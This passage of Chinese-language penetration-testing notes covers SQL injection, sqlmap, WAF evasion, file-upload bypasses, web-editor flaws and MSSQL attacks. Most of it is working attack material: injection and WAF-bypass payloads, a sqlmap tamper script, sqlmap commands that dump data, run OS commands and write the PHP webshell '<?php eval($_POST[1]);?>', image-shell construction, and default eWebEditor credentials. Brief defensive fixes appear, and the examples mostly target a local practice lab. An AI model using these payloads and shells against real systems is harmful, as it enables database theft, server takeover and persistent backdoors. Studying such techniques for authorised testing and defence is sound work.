-1%2527 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),database() -- +
```

###### ②相关函数

* **urldecode()**、**rawurldecode()**

###### ③url编码字符

![URL中所有可打印字符](http://113.45.142.235:9001/laffrex/pictures/URL中所有可打印字符.png)

| 符号        | 对应url编码     |
| ----------- | --------------- |
| **空格**    | **%20或%2B(+)** |
| 双引号"     | %22             |
| **井号#**   | **%23**         |
| 百分号%     | %25             |
| 和&         | %26             |
| **单引号'** | **%27**         |
| **左括号(** | **%28**         |
| **右括号)** | **%29**         |
| 星号*       | %2A             |
| 加号+       | %2B             |
| 逗号，      | %2C             |
| 减号-       | %2D             |
| 斜杠/       | %2F             |
| 反斜杠\     | %5C             |

##### d. Base64注入

* Base64编码是基于64个可打印字符来表示二进制数据的方法，可打印字符包括**A-Z，a-z，0-9，+，/**，把**不可见字符全部编码为可见字符**，**大大降低传输时出现错误的可能性**

###### ①原理

* 针对传递的参数被base64**加密后的注入点进行注入**，常用于**绕过一些WAF**检测

###### ②注入方法

1. 先将原本参数**解密**，再结合**之前注入手法**进行设计
2. 语句设计完成后，**重新加密**作为参数进行注入

###### ③实例

```sql
1.原参数
	YWRtaW4n
2.解密后进行语句设计
	admin') and updatexml(1,concat(0x7e,database(),0x7e),1) -- qwe		'
3.base64编码后进行注入	        
	YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsZGF0YWJhc2UoKSwweDdlKSwxKSAtLSBxd2U=
```

##### e. 堆叠注入

###### ①原理

* 将**许多语句**通过**分号**叠加在**一起执行**

###### ②满足条件

1. **mysqli_multi_query支持**，**mysql_query不支持**
2. 使用堆叠注入前，须知道数据库的**表名、列名等**
3. 可能受到**API**或**数据库引擎不支持**的限制

###### ③实例

```sql
#插入数据
	1';insert into users(username,password) value('icq','icq') -- qwe
```

##### f. 二次注入

###### ①原理

* 已**存储的用户恶意输入**被**读取**后，**再次进入到sql查询语句**导致服务端SQL语句被**恶意修改并成功**执行的注入行为

###### ②满足条件

1. 网站在对用户输入**恶意数据**时进行**转义处理**
2. 恶意数据**插入到数据库**时又被**还原并存储**到数据库中
3. 系统**再次调用**该恶意数据并**执行sql查询**时，**没有转义**数据内特殊字符

###### ③实例

```sql
#一个页面，能显示登录后的用户名，这时可以注册不同的payload名的账号，来进行注入
1' and updatexml(1,concat(0x7e,database(),0x7e),1)#

1' order by 5#

-1' union select 1,database(),3,4,5#

-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4,5#

```

### 9. Sqlmap

#### (1). 使用流程

##### a. 检测注入点

* sqlmap -u "带参数网址"

##### b. 查看所有数据库

* sqlmap -u "带参数网址" --dbs

##### c. 查看当前数据库

* sqlmap -u "带参数网址" --current-db

##### d. 查看表名

* sqlmap -u "带参数网址" -D [数据库名] --tables

##### e. 列出所有字段名

* sqlmap -u "带参数网址" -D [数据库名] -T [表名] --columns

##### f. 列出字段内容

* sqlmap -u "带参数网址" -D [数据库名] -T [表名] -C [列名...] --dump

| 参数           | 含义                                                         |
| -------------- | ------------------------------------------------------------ |
| -a,--all       | 检索所有内容                                                 |
| --current-user | 获取当前用户信息                                             |
| --tables       | 获取特定数据库的所有表信息                                   |
| --columns      | 获取特定表的所有列信息                                       |
| --schema       | 获取数据库的整体架构信息                                     |
| --dump         | 导出特定数据库或表的数据,不跟任何表或字段则为导出所有数据库信息 |
| --dump-all     | 导出整个数据库服务器上的所有数据                             |
| -D、-T、-C     | 分别指定数据库、表、字段                                     |

#### (2). 清除历史记录

##### a. Windows

* C:\Users\26254\AppData\Local\sqlmap

##### b. Linux

* /home/test/.sqlmap
* /root/.sqlmap

##### c. 清除

1. python sqlmap.py --purge
2. 删除sqlmap的output文件夹
3. python sqlmap.py --flush-session

#### (3). 基本参数

##### a. --privileges

* 测试注入点权限

```sql
sqlmap -u [URL] --privileges  #测试所有用户的权限
sqlmap -u [URL] --privileges -U [用户名] #测试指定用户权限
```

##### b. --data/-r

* POST提交方式

1. 用法

```sql
sqlmap -u [URL] --data "POST参数" 	#通过POST方式提交参数
sqlmap -u [URL] -r "txt文件"	#读取文件中的HTTP数据包内容来测试POST注入和HTTP Header注入
```

2. 注意

> 1. **-p可指定参数**
> 2. **参数后加 *** 可以只测试该参数

##### c. -v

1. 用法

```sql
sqlmap -u [URL] -v 3 	#指定输出级别为3
```

| 数据级别 | 含义                               |
| -------- | ---------------------------------- |
| 0        | 只显示python的回溯、错误和关键信息 |
| 1        | 显示信息和警告信息                 |
| 2        | 显示调试信息                       |
| **3**    | **显示注入使用的攻击载荷**         |
| 4        | 显示HTTP请求                       |
| 5        | 显示HTTP响应头                     |
| 6        | 显示HTTP相应页面的内容             |

2. 注意

> **默认输出级别为1**

##### d. --level

* 探测等级

1. 用法

```sql
sqlmap -u [URL] --level 3	#指定测试等级为3
```

| 测试等级 | 含义                                  |
| -------- | ------------------------------------- |
| 1        | 对GET和POST的数据进行测试             |
| 2        | 会对HTTP cookie进行测试               |
| 3        | 会对HTTP User-Agent/Referer头进行测试 |
| 4-5      | 测试更全面，但更慢                    |

2. 注意

> 1. **默认测试等级为1**
> 2. 不确定那个Payload或参数为注入点时，建议使用更高的level值

##### e. --is-dba

* 判断当前用户的管理员权限

1. 用法

```sql
sqlmap -u [URL] --is-dba	#查看是否为数据库管理员账户
```

2. 注意

> 1. 返回的结果代表是否有**写权限**，可以在服务器上写入**一句话木马**
> 2. 是**管理员返回True**，否则返回False

##### f. -b/--banner

* 列出数据库管理系统信息

###### ①用法

```sql
sqlmap -u [URL] --banner	#返回①数据库系统版本号②最后的补丁级别③底层的操作系统信息
```

##### g. -m

* 批量进行注入检测

1. 用法

```sql
sqlmap -m "filename"	#扫描指定文件内的网址
```

##### h.  --cookie

* 指定cookie

1. 用法

```sql
sqlmap -u [URL] --cookie="name:value"
```

2. 注意

> 1. sqlmap**不支持--method**指定http请求的方法
> 2. **默认不扫**cookie的内容，**除非level ≥ 2**
> 3. cookie内的默认分隔符为**分号;**

##### i.--user-agent/--random-agent

* 指定User-Agent

1. 用法

```sql
sqlmap -u [URL] --user-agent="..."	#指定某一个值
sqlmap -u [URL] --random-agent	#sqlmap会从文件./txt/user_agents.txt中随机选取一个User-Agent
```

2. 注意

> 同一次会话使用同一个User-Agent，而不是每发一次包就换一个

##### j. --technique

* 指定注入类型

1. 用法

```sql
sqlmap -u [URL] --technique [类型]  
```

| 参数                   | 类型         |
| ---------------------- | ------------ |
| U(Union query-based)   | 联合查询注入 |
| E(Error-based)         | 基于报错注入 |
| B(Boolean-based blind) | 布尔盲注     |
| T(Time-based blind)    | 时间盲注     |
| S(Stacked queries)     | 堆叠查询注入 |
| Q(Inline queries)      | 内联查询注入 |

##### k. --batch

* 默认选项均选择Y

##### l. --delay

* 限制请求间隔

1. 用法

```sql
sqlmap -u [URL] --delay [秒数]	#提高发包间隔		
```

2. 注意

> ### 当有警告 `target URL content is not stable` 时使用

#### (4). 进阶参数

##### a.  --proxy

* 使用**代理连接**到目标URL

```sql
python sqlmap.py -u "127.0.0.1/sqli-labs-master/Less-1/?id=1" --proxy=http://127.0.0.1:8080 
```

##### b. --dbms

* 强制指定后端DBMS的值

```sql
python sqlmap.py -u "url" --dbms=MYSQL #指定后端数据库时mysql
python sqlmap.py -u "http://127.0.0.1/sqli-labs-master/Less-1/?id=1" --dbms=mysql --batch
```

##### c.  --risk

* ###### 指定要执行的测试风险级别(级别1-3，默认为1,)

```sql
python sqlmap.py -u "url" --risk [风险级别]

python sqlmap.py -u "http://127.0.0.1/sqli-labs-master/Less-1/?id=1" --risk 2
```

##### d. 其他参数

| 参数               | 含义                                 |
| ------------------ | ------------------------------------ |
| --alert=ALERT      | 在发现SQL注入时运行主机操作系统命令  |
| --beep             | 在提问、发现漏洞时发出蜂鸣声         |
| --dependencies     | 检查缺失的(可选的)sqlmap依赖项       |
| --disable-coloring | 禁用控制台输出着色                   |
| --list-tampers     | 显示克用的篡改脚本列表               |
| --no-logging       | 禁用日志记录到文件                   |
| --offine           | 在离线模式下工作                     |
| --purge            | 安全地从sqlmap数据目录中删除所有内容 |

![sqlmap参数杂项](http://113.45.142.235:9001/laffrex/pictures/sqlmap参数杂项.png)

#### (5). 执行sql语句

##### a. --sql-query

* 直接**执行指定的sql语句**

```sql
sqlmap -u [url] --sql-query="sql语句"

python sqlmap.py -u "127.0.0.1/sqli-labs-master/Less-1/?id=1" --sql-query="select version()"
```

##### b. --sql-shell

* 直接获得*交互式的SQL**命令shell*** (用于执行update、delete、drop、alert等语句)
* **执行的语句与注入点的类型有关**
* 输入***X或者Q***退出交互命令行

```sql
sqlmap -u [URL] --sql-shell

python sqlmap.py -u "127.0.0.1/sqli-labs-master/Less-1/?id=1" --sql-shell
```

##### c. --sql-file

* 直接执行sql文件中的语句

```sql
sqlmap -u [URL] --sql-file=sql文件

python sqlmap.py -u "127.0.0.1/sqli-labs-master/Less-1/?id=1" --sql-file="D:\NetTools\sqlmap\sql_file.sql"

sql_file.sql内容：
select version();
select @@datadir;	#输出mysql存放数据的路径
```

#### (6). 文件操作

##### a. 防御

* 输入时对**敏感语句过滤**
* my.ini中配置secure_file_priv=**null**

##### b. 读文件

###### ①满足条件

1. **secure_file_priv**不为**null**
2. mysql有对某个**目录读写**的权限
3. 知道**绝对路径**
4. 文件**必须在服务器上存在**
5. max_allowed_packed     //读写文件最大的字节数

###### ②--file-read

* 原理：利用**load_file()**函数

```sql
sqlmap -u [url] --file-read "文件绝对路径"		#读取文件可以是文本、二进制文件

python sqlmap.py -u "http://127.0.0.1/sqli-labs-master/Less-1/?id=1" --file-read "D:\phpstudy_pro\WWW\test.txt"
```

##### c. 写文件

###### ①满足条件

1. 有**写文件**权限
   * **secure-file-priv**不为**null**
   * mysql有对某个**目录读写**的权限
2. **知道绝对路径**
3. 必须能**绕过单引号过滤**

###### ②使用--sql-query、--sql-shell

* 原理：利用mysql的 **outfile、dumpfile**函数

```sql
#1. 向文件写入内容
python sqlmap.py -u "127.0.0.1/sqli-labs-master/Less-8/?id=1" --sql-query="select 1,2,'aaa' into outfile 'D:\phpstudy_pro\test5.txt'" --batch
#2. 写入webshell
python sqlmap.py -u "127.0.0.1/sqli-labs-master/Less-8/?id=1" --sql-query="select '<?php eval($_POST[1]);?>' into outfile 'D:\phpstudy_pro\WWW\shell3.php'";		#可以转化为16进制写入
#3. 获取绝对路径
python sqlmap.py -u "127.0.0.1/sqli-labs-master/Less-8/?id=1" --sql-query="select @@datadir;"
#4. 查看secure_file_priv的值
python sqlmap.py -u "http://127.0.0.1/sqli-labs-master/Less-8/?id=1" --sql-query="select @@secure_file_priv;"
```

##### d. 上传文件

###### ①满足条件

1. 有**写文件**权限
   * **secure-file-priv**不为**null**
   * mysql有对某个**目录读写**的权限
2. **知道绝对路径**
3. 必须能**绕过单引号过滤**

###### ②--file-write、--file-dest

```sql
sqlmap -u [URL] --file-write [源路径的绝对地址] --file-dest [目的路径的绝对地址]
python sqlmap.py -u "http://127.0.0.1/sqli-labs-master/Less-8/?id=1" --file-write "C:\\123.txt" --file-dest "C:\\phpstudy_pro\\www\\test.php"
```

##### e. 执行命令

###### ①-os-shell \ --os-cmd

* 原理：利用mysql的**outfile、dumpfile等写文件**函数，先上传一个**具有上传功能**的Webshell，再上传一个**具有各种功能**的Webshell

```sql
sqlmap -u [URL] --os-cmd="whoami"
python sqlmap.py -u "http://127.0.0.1/sqli-labs-master/Less-1/?id=1" --os-cmd="whoami"
```

### 10. Waf绕过

#### (1). 基本流程

1. 身份认证

2. 数据包解析

3. 规则系统匹配

4. 是否拦截

   ![WAF拦截流程](http://113.45.142.235:9001/laffrex/pictures/WAF拦截流程.png)

#### (2). 方法

##### a. 大小写绕过

> 1. 只针对**小写或大写**的**关键字匹配技术**
> 2. **正则不完善**或是没有用**大小写转换函数**用法

```sql
-1' UnIon SelEct 1,2,3
```

##### b. 替换关键字



###### ①关键字双写

> **只验证一次**字符串或字符串**过滤不完整**用法

```sql
-1' ununionion seselectlect 1,2,3		'#可以构造更复杂的语句
```

###### ②同价词替换

> 针对**特殊关键字**进行检测

| 字符 | 替换                   |
| ---- | ---------------------- |
| and  | &&                     |
| or   | \|\|                   |
| =    | <>                     |
| 空格 | %20  (url编码)         |
| 空格 | %09  (tab键，水平)     |
| 空格 | **%0a  (换行符)**      |
| 空格 | %a0  (空格)            |
| 空格 | **%0b  (tab键，垂直)** |
| 空格 | %0c  (新的一页)        |
| 空格 | %0d  (return功能)      |
| 空格 | /**/                   |

###### ③特殊字符拼接

> **拼接特殊字符**来绕过WAF检测

```sql
id=1;exec(master..xp_cmdshell'net user')
=>  id=1;exec('maste'+'r..xp'+'_cmdshell'+'"net user"')
```

##### c. 编码绕过

> 利用浏览器上的**进制转换或者语言编码规则**来绕过waf
>
> unicode、HEX、URL、ascii、base64等URL编码

###### ①URL编码

> 浏览器会对地址栏中，**非保留字**的字符进行URL编码

```sql
#如果waf拦截了union select   (可以尝试多次编码绕过)
	1' union select 1,2,3 --+
=> 	1' %75%6E%69%6F%6E %73%65%6C%65%63%74 1,2,3 --+
```

###### ②Unicode编码

```sql
//如果waf拦截了union select
	1' union select 1,2,3		'#替换了i,也可以全部替换
=>	1' un%u0069on sel%u0065ct 1,2,3
```

###### ③16进制

##### d. 注释绕过

* ``//``   `` -- ``  ``/* * /``  ``#``  ``--+``  ``-- -``  ``;``  ``--a``  ``/*! */``

  > 利用**语言函数特性**来绕过waf的规则

###### ①普通注释

> 使用/* * /在构造的**查询语句中插入注释**，规避对**空格的依赖**或**关键字**识别

```sql
	1' union select 1,2,3
=> 	1' /**/union/**/select 1,2,3
=>	1' /**/union/**/select 1,2,database/*%!a*/()		'# 使用/*%特殊符号*/的形式绕过对/**/的正则过滤
```

###### ②**内联注释**

> **/*! */**只有mysql能识别

```python
1. /*! code*/	内联注释可以用于整个SQL语句中
2. 过滤了union、where、table_name、table_schema、=、and、information_schema等词，可以使用
	=> /*!%23/*%0a关键词*/ 来绕过
	=> /*!99999*/
```

##### e. 参数污染

* HPP(HTTP Parameter Polution)又称作**重复参数污染**，当同一参数出现多次，不同中间件会解析为不同的结果

* 如果WAF**只检测同名参数的第一个或最后一个**，并且**中间件特性**正好取与**WAF相反的参数**，则可成功绕过

  ![参数污染](http://113.45.142.235:9001/laffrex/pictures/参数污染.png)

  ```sql
  	index.php?id=select 1,2,3 from table
  =>	index.php?id=select 1&id=2,3 from table
  ```

##### f. 缓冲区溢出

> 许多WAF使用**C语言**写的，而C语言**没有缓冲区保护机制**，测试向量时**超出了其缓冲区长度**时，会引发Bug从而绕过

##### g. 整合绕过

> 结合使用**前面的各种绕过技术**

##### h. 分块传输绕过

> 将**传输的内容分块**时，处理后的HTTP请求由于**和已知的payload相差较大**，所以可以起到绕过作用

![分快传输](http://113.45.142.235:9001/laffrex/pictures/分快传输.png)

##### i. 特殊符号绕过

* 使用**反引号 `** 可以绕过**空格和正则**，特殊情况下还可以将其作为注释符用

* 使用 **-+.** ，起到**连接字符串**的作用


```sql
index.php?id=-1.0 union select"1",2,3
index.php?id=-1E0 union select~1,2,3
index.php?id=-1 union select 1,2,version()"from users"
index.php?id=-1 union select`id`,1,2 from users"
index.php?id=-1 union select 1,2,version()`from users`
```

###### ①普通括号

```sql
index.php?id=(-1)union(select(1),(2),(3)from(users))
index.php?id=(1)or(0x50=0x50)
index.php?id=(-1)union((((((select(1),hex(2),hex(3)from(users)))))))
```

###### ②花括号

```sql
index.php?id=-1 union select 1,{x 2},3
```

###### ③等号

```sql
#使用``like``来替代
1' union select 1,2,(select group(table_name) from information_schema.tables where table_schema=database())#
=> 1' union select 1,2,(select group(table_name) from information_schema.tables where table_schema like database())#
```

###### ④and和or

```sql
#使用关键字双写、关键字替换、内联注释、多行注释来替代
```

###### ⑤逗号

```sql
	1' union select 1,2,3 --+
=> 	1' union select * from (select 1)a join (select 2)b join (select 3)c --+
```


##### j. 过滤掉and和or的盲注

```sql
index.php?id=strcmp(left((select username from users limit 0,1),1),0x42)#
index.php?id=strcmp(left((select+username+from+users+limit+0,1),1)0x42)#

#strcmp()函数，两值相等返回0，小于返回-1，大于返回1

#sql语句为：
select * from users where id=strcmp(left((select username from users limit 0,1),1),0x42);
```

#### (3). 特定符号被过滤

###### ①空格被过滤

| 符号 | 替换内容               |
| ---- | ---------------------- |
| 空格 | %20  (标准空格)        |
| 空格 | %09  (tab键，水平)     |
| 空格 | **%0a  (换行符)**      |
| 空格 | %a0  (不间断空格)      |
| 空格 | **%0b  (tab键，垂直)** |
| 空格 | %0c  (新的一页)        |

###### ②单引号被过滤

* 将字符转换为16进制，不使用单引号

  ```sql
  	select * from users where username='Dumb'
  =>	select * from users where username=0x44756d62
  ```

###### ③逗号被过滤

```sql
#1. from to
	select substr(database(),1,1);
	=> select substr(database() from 1 to 1);
#2. join
	select 1,2,3
	=> select * from (select 1)a join (select 2)b join (select 3)c
#3. offset
	select * from users limit 0,1;
	=> select * from users limit 1 offset 0;
```

###### ④逻辑判断符被过滤

```sql
#1. 等于号(=)绕过
	①1' or 1=1  =>  1' or 1<>1
	②1' or 1=1  =>  1' or 1 like 1a
#2. 单个比较符的绕过
	#1. sqlmap可以使用between脚本，用greatest()返回给定表达式中最大值，least()返回给定表达式中最小值
		select * from users where id=1 and ascii(substr(user(),1,1))>100
		=> select * from users where id=1 and greatest(ascii(substr(user(),1,1)),100)=100
	#2. 使用字符编码
		a. 实体编码   < => &lt;   > =>  &gt;
		b. ASCII码	< => %3C	> =>  %3E 
		c. Unicode编码	< => \u003C   > =>  \u003E
	#3. 使用替代函数
		<  => CHAR(60)   >  =>  CHAR(62)
```

###### ⑤or and xor not绕过

```sql
#1. 使用逻辑判断符替代
	and  =>  &&
    or   =>  ||
    xor  =>  |
    not  =>  !
#2. 使用内联注释
	/*!and*/、/*!%23/*%0aand*/
```

###### ⑥函数过滤

```sql
1. sleep()	=> benchmark(10000000,md5(1))
2. ascii()  =>  ord()
3.  group_concat()	=>  concat_ws()
		例如：select group_concat(1,' -- ',1,' -- ',1)  => select concat_ws(' -- ',1,1,1)
4. substr()  =>  mid()、substring()、left()、right()
```

###### ⑦常见绕过方式

```sql
1. 绕过关键字检测
    a. user() --> user/*//--//*/()  或  database/*%!a*/()
    b. from  -->  /*!%23/*%0aform*/
    c. 大小写替换
    d. 重复关键字
2. 绕过2个及以上检测语句
union select  --> union/*//--/*/select
union select 1,2,3 -->   union /*!--+/*%0aselect/*!1,2,*/ 3
```

#### (3). 编写tamper

##### a. 检测WAF种类

```python
1. 检测WAF种类
	sqlmap -u [URL] --identify-waf(--check-waf)
2. 绕过WAF
	sqlmap -u [URL] --tamper "模块名"
```

##### b. 模板

```python
from lib.core.enums import PRIORITY
import os
__priority__ = PRIORITY.LOWEST
def dependencies():
    pass
def tamper(payload, **kwargs):
    payload = payload.replace('AND', '/*!%23/*%0aAND*/')
    payload = payload.replace('DATABASE()', 'DATABASE/*$%^a*/()')
    payload = payload.replace('FROM', '/*!%23/*%0afrom*/')
    payload = payload.replace('UNION ALL', 'union/*!99999*/all')
    payload = payload.replace('SESSION_USER()', 'USER()')
    payload = payload.replace('USER()', 'USER/*////*/()')
    return payload
```

## 文件上传

### 1. 定义

* 文件上传时，未考虑文件**格式、后缀的合法性校验**问题，或只考虑在**前端通过js进行后缀校验**

  ![文件上传漏洞](http://113.45.142.235:9001/laffrex/pictures/文件上传漏洞.png)

### 2. 产生条件

1. **未过滤或未严格过滤**文件格式、后缀

   > 1. 文件检测被绕过
   > 2. 不完善的黑名单扩展名
   > 3. 文件路径被截断

2. **中间件**存在**解析漏洞**

3. HTTP**不安全方法(PUT)**

### 3. 前提条件

1. PUT方法未开启

> 1. 存在文件上传功能点
> 2. 上传目录具有**至少733权限**
> 3. Web容器**可以解析上传的脚本**

2. PUT方法开启
   * 忽略以上条件

### 4. 防御

#### (1). 代码角度

> 1. 采用**白名单策略**，严格限制上传文件的后缀名
> 2. 进行**二次渲染**，过滤掉图片马中的恶意代码
> 3. 上传**文件重命名**，尽量少的从客户端获取信息
> 4. 避免**文件包含漏洞**
> 5. 严格**处理文件路径**、防御00**截断漏洞**，避开空格、点、::`$`DATA`$`等**Windows特性**

#### (2). 服务器角度

> 1. **及时更新Web容器**，防止解析漏洞的产生
> 2. **可写目录不给执行权限**

### 5. 漏洞查找步骤

![文件上传漏洞寻找步骤](http://113.45.142.235:9001/laffrex/pictures/文件上传漏洞寻找步骤.png)

### 6. 绕过方式

#### (1). 前端js检测

* JS代码通常采用**白名单策略，检测文件后缀名**

##### a. 修改JS代码

* JS运行环境为浏览器，可以**直接修改JS代码，甚至删除表单事件，禁用JS**

##### b. 修改文件后缀

1. 先使用**白名单后缀名**，绕过JS检测，上传数据包
2. 再使用**Burp拦截**数据包，**修改后缀名为原后缀**

****

#### (2). 后端文件类型检测

##### a. MIME类型检测

> 抓包修改上传包的**Content-Type字段的MIME文件类型**为服务器允许的类型

![MIME类型](http://113.45.142.235:9001/laffrex/pictures/MIME类型.png)

##### b. 文件头检测

> 在恶意脚本开始处加上文件头，绕过服务器的后端文件类型检测

* 文件头是**位于文件开头**的一段承担一定任务的数据，就是为了**描述文件的一些重要属性**，例如图片长度、宽度、像素尺寸等

###### ①常用图片文件幻数

| 图片格式 | 文件幻数(image number)  |
| -------- | ----------------------- |
| PNG      | 89 50 4E 47 0D 0A 1A 0A |
| JPG      | FF D8 FF E0 00 10 4A 46 |
| GIF      | 47 49 46 38 39 61       |

###### ②常用图片文件头

| 文件类型       | 文件头                                            |
| -------------- | ------------------------------------------------- |
| jpeg、jpg、png | JPGGraphic File                                   |
| gif            | GIF89A                                            |
| doc、xls、ppt  | MS Compound Document v1 or Lotus APProach APRfile |
| zip            | Zip Compressed                                    |

****

#### (3). 白名单绕过

* 白名单策略：文件扩展名不在白名单中为不合法

##### a. 00截断

###### ①利用条件

* php版本小于**5.2.4**
* php的**Magic_quotes_gpc为OFF**状态

###### ②使用方法

1. 知道上传路径

   > 利用burp抓包，在上传路径后面加上1.php%00，然后将%00进行url编码。

2. 不知道上传路径

   > 文件名改为1.php+.jpg，使用burp抓包后，**将+的hex数值改为00**

##### b. 配合文件包含漏洞

> 1. 制作图片马
>    copy shell.php + 1.png shell.png  
> 2. 上传图片马
> 3. 通过文件包含漏洞使用图片马
>    上传后的相对路径 + include?file=/upload/shell.png

##### c. 中间件解析漏洞

###### ①Apache

1. 多后缀

   1. 存在版本

   * **Apache1.x**和**Apache2.x**

   2. 解析规则

      * **从右向左**开始判断解析，如果后缀名为**不可识别文件解析**，则**往左判断**，直到能识别，**否则会暴露其源码**

      * 能够识别的文件可以在**mime.types**文件中查看

      * ```
        访问/test.php.aaa.bbb		apache会右往左解析，直到.php
        ```

   3. 修复建议

      * **后缀验证**尽量使用**白名单**的方式

2. 配置问题

   1. 产生原理

      * 如果Apache的conf里有这样一行配置`AddHandler php5-script.php`，这时只要**文件名里包含.php**，即使文件名是**其他后缀**，也**会以php来执行**

      * 如果在Apache的conf里有这样一行配置`AddType application/x-httpd-php .jpg`，**即使扩展名是.jpg**，一样以php方式执行

   2. 修复建议

      * apache配置文件中，禁止`.php.*` 这样的文件执行，**配置文件里**面加入以下代码

        ```
        <Files~".(php.|php3.)">
        	Order Allow,Deny
        	Deny from all
        </Files>
        ```

      * 使用**伪静态**能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到

3. htaccess文件解析

   * htaccess文件可以**修改MIME类型**，如果.htaccess文件可以上传，就尝试使用**.htaccess来配置其他文件**

   * .htaccess文件内写入以下内容，成功后可以将指定后缀名文件解析为.php文件

     ```
     <FileMatch ".jpg"> SetHandler application/x-httpd/php</FilesMatch>
     or
     AddType application/x-httpd/php .jpg
     or
     SetHandler application/x-http-php
     ```

****

###### ②IIS6.0

1. 目录解析

   1. 形式

      * ```
        /xx.asp/xx.jpg
        ```

   2. 原理

      * 在网站下创建文件夹名字为`.asp` 、`.asa`的文件夹，其**目录内的任何扩展名的文件**都被当做**asp文件**来解析并执行

2. 文件解析

   1. 形式

      * ```
        /xx.asp;.jpg	(利用特殊符号冒号;)
        ```

   2. 原理

      * 在IIS6.0下，服务器**默认不解析**`;`后面的内容

3. 解析文件类型

   1. 形式

      * ```
        /test.asa 、 /test.cer 、 /test.cdx
        ```

   2. 原理

      * IIS6.0默认的可执行文件除了asp还包括这三种`asa` `cer` `cdx`，会将这三种扩展文件解析为**asp文件**

****

###### ③PHP CGI解析漏洞

* 又称为IIS7.0/IIS7.5/Nginx1.x畸形解析漏洞

  1. 利用条件

     1. **Fast-CGI运行模式**
     2. **php.ini文件cgi.fix_pathinfo**=1(默认为1)
     3. 取消勾选**php.cgi.exe**程序的 “Invoke handler only if request is mapped to”

  2. 形式

     * ```
       如果在一个文件路径/xx.jpg后面加上/xx.php，会将/xx.jpg/xx.php解析为php文件
       ```

  3. 修复方法

     1. 配置php.ini例cgi.fix_pathinfo=0，并重启服务器
     2. 在模块映射中勾选请求限制

****

###### ④空字节代码执行漏洞

* Nginx<8.03

  1. 影响版本

     * 0.5、0.6、0.7<=0.7.65，0.8<0.8.37

  2. 原理

     * 在使用php-FastCGI执行php时，URL遇到**%00空字节**时，与**FastCGI处理不一致**，导致可以在图片中**嵌入PHP代码**然后通过访问``xx.jpg%00.php` 来执行其中的代码

  3. 修复方法

     1. 在nginx中配置，禁止在上传目录下执行php，或在fcgi.conf配置中加入如下代码：

        ```php
        if($request_filename~*(.*)\.php) {
        	set$php_url$1;
        }
        if(!-e$php_url.php){
        return403;
        }
        ```

     2. 升级到最新版的nginx

****

#### (4). 黑名单绕过

##### a. 后缀名变形

###### ①大小写

> Windows服务器：使用pHp、PhP等词替换

###### ②特殊后缀解析

> php、php2、php3、php4、php5、php6、php7、pht、phtm、phtml

###### ③双写

> 若只过滤一次后缀名，双写即可

##### b. 特殊字符绕过

* Windows特性，在**结尾的点**和**语句中的空格**以及文件流标识**::$Data**会被去除
* **::$Data后的数据会被当做文件流处理**，不会检测后缀名

##### c. 00截断

##### d. 中间件解析漏洞

##### e. 配合文件包含漏洞



### 7. 编辑器漏洞

#### (1). FCKeditor

##### a. 漏洞版本

| 版本                   | 漏洞说明                                                     |
| ---------------------- | ------------------------------------------------------------ |
| Version2.2             | Apache + Linux环境下，在上传文件后面加个`.`突破              |
| Version<=2.4.2 for php | 上传的地方并未对Media类型进行上传文件类型的控制，导致用户上传任意文件 |
| **Version <=2.4.3**    | **FCKeditor被动限制策略所导致的过滤不严问题**                |
| 较高版本               | FCKeditor文件上传`.`变成`_`下划线                            |

##### b. 较高版本对应漏洞

###### ①查看版本

```cmd
方法1：  /fckeditor/editor/dialog/fck_about.html
方法2：  /fckeditor/_whatsnew.htm
```

###### ②查看上传地址

```cmd
/fckeditor/editor/filemanager/connectors/test.html
/fckeditor/editor/filemanager/connectors/uploadtest.html
/fckeditor/editor/filemanager/browser/default/connectors/test.html
/fckeditor/editor/filemanager/upload/test.html
```

###### ③验证漏洞

```php
#1. 在上传页面创建一个文件夹test.asp，结果变成了test_asp
#2. 使用递归创建or二次创建
	#指令：
        /fckeditor/editor/filemanager/connectors/asp/connectors.asp?command= CreateFolder&Type=类型&CurrentFolder=/一级目录名&Newfoldername=二级目录名
```

* 在一级目录`test.asp`中上传一个木马，然后就可以getshell了

****

#### (2). Ewebeditor

* 使用**默认的EWebEditor编辑器配置**安全风险最高，默认情况下其编辑器的**数据库可以通过浏览器下载**，一旦**破解其后台**管理账号和密码，则可以通过**修改其样式管理**，达到**上传asp网页木马**的目的

##### a. 默认信息

1. 默认数据库路径

   ```php
   /db/ewebeditor.mdb
   /db/db.mdb
   /db/%23ewebeditor.mdb
   ```

2. 默认密码

   ```php
   admin/admin888
   admin/admin
   admin/123456
   ```

3. 系统默认

   ```php
   ewebeditor.asp?id=content1&style=standards
   ```

4. 默认管理地址

   ```php
   #2.80以前
   	ewebeditor/admin_login.asp
   #以后版本
   	admin/login.asp
   ```

##### b. 存在的漏洞

![Ewebeditor存在漏洞](http://113.45.142.235:9001/laffrex/pictures/Ewebeditor存在漏洞.png)

## MSSql注入

### 1. 定义

* 使用**微软开发的Sql Server数据库**来进行网站搭建

### 2. 技战法

1. SQL注入查登录用户Hash

   * **查询登录用户的HASH密码**

   ```sql
   id=0' union select 1,2,(select master.dbo.fn_varbintohexstr(password_hash) from sys.sql_logins where name='sa')--+'
   #利用函数强制转换为16进制，避免受到格式的影响
   ```

   Hash格式：**0x0100(头部)** + **8位salt** + **40位区分大小写的hash**

2. 扩展存储过程xp_cmdshell执行命令

3. 系统存储过程sp_oacreate + sp_oamethod执行命令

4. 扩展存储过程xp_regwrite写注册表(映像劫持、远程桌面、开机启动项等)

5. 利用CLR组件执行系统命令

6. 系统存储过程sp_addextendproc恢复组件

7. 差异备份写webshell

8. 日志备份写webshell

****

### 3. 权限角色

#### (1). 固定服务器角色

##### a. 包含

| 固定服务器角色 | 说明                                   |
| -------------- | -------------------------------------- |
| **sysadmin**   | **执行SQLServer中的任何动作**          |
| serveradmin    | 配置服务器设置                         |
| setupadmin     | 安装、复制和管理扩展过程               |
| securityadmin  | 管理登录、数据库创建的权限以及阅读审计 |
| processadmin   | 管理SQLServer进程                      |
| dbcreator      | 创建和修改数据库                       |
| diskadmin      | 管理磁盘文件                           |

##### b. 使用

1. 通过``and 1=(select is_srvrolemember('sysadmin'))``来判断服务器权限

2. 添加、删除固定服务器角色成员

   * **只有固定服务器角色的成员来能执行这2个系统过程**

   ```
   sp_addsrvrolemember
   sp_dropsrvrolemember
   ```

****

#### (2). 固定数据库角色

##### a. 包含

* 通过``and 1=(select if_member('db_owner'))``来判断数据库权限

| 固定数据库角色    | 说明                                               |
